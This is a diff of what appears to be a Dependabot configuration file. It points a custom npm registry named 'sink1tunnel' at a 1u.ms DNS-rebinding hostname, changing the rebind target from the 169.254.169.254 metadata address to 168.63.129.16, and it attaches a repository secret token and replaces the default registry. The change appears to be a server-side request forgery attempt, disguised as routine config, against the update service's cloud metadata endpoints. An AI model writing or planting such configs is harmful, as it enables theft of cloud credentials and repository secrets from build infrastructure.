@@ -2,7 +2,7 @@ version: 2
 registries:
   sink1tunnel:
     type: npm-registry
-    url: http://k42-make-206-189-156-69-rebind-169-254-169-254-rr.1u.ms/
+    url: http://k43-make-206-189-156-69-rebind-168-63-129-16-rr.1u.ms/
     token: ${{secrets.SINK1_TOKEN}}
     replaces-base: true
 updates:
